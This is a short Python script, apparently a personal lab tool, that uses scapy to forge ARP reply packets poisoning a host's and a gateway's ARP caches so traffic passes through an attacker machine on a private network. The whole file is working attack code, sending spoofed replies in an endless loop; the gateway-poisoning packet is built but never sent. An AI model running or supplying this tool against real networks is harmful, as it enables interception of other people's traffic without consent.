# 2018/10/12
# arp spoof simple tool
import sys
import time
from scapy.all import(
    get_if_hwaddr,  # get network interface func
    getmacbyip,     # get mac address by ip
    ARP,            # ARP package class 
    Ether,          # Ether data package
    sendp           # send data in second layer
)


pkg = Ether(src='00:0c:29:79:ae:5a', dst='00:0c:29:da:82:5d')/ARP(hwsrc='00:0c:29:79:ae:5a', psrc='192.168.158.2', hwdst='00:0c:29:da:82:5d', pdst='192.168.158.129', op=2)  # tell 192.168.158.129  gateway is kali's mac address
pkg_gate = Ether(src='00:0c:29:79:ae:5a', dst='00:50:56:e9:fb:e4')/ARP(hwsrc='00:0c:29:79:ae:5a', psrc='192.168.158.129', hwdst='00:50:56:e9:fb:e4', pdst='192.168.158.2', op=2)  # tell  gateway host is kali's mac address
while True:  # send arp reply package to spoof host
    sendp(pkg, inter=2, iface='eth0')
    print("arp spoof to host...")

